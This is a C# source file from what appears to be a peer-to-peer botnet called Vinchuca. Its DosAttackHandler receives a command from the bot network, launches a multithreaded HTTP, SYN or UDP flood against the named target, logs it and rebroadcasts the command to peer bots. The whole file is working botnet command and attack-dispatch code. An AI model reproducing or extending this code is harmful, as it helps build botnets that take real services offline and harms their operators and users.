﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Configuration;
using Vinchuca.Actions.DDoS;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.Command;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.Network.Protocol.Handlers.Command
{
    class DosAttackHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public DosAttackHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as DosAttackMessage;
            if (Attacker.Attackers.ContainsKey(msg.AttackId))
            {
                return;
            }

            var attack = AttackFactory.Create(msg);
            var attacker = new Attacker(msg.Threads, attack);
            attacker.Start();
            Attacker.Logger.Info("Attacking ({2}) session {0} targeting {1} ", msg.AttackId, msg.Target, Enum.GetName(typeof(DosAttackMessage.DosType), msg.Type));
            Attacker.Attackers.Add(msg.AttackId, attacker);

            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
        }
    }

    static class AttackFactory
    {
        public static Attack Create(DosAttackMessage msg)
        {
            switch (msg.Type)
            {
                case DosAttackMessage.DosType.HttpFlood:
                    return new HttpFlood(msg.Target, msg.Buffer);
                case DosAttackMessage.DosType.SynFlood:
                    return new SynFlood(msg.Target);
                case DosAttackMessage.DosType.UdpFlood:
                    return new UdpFlood(msg.Target);
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }
    }
}
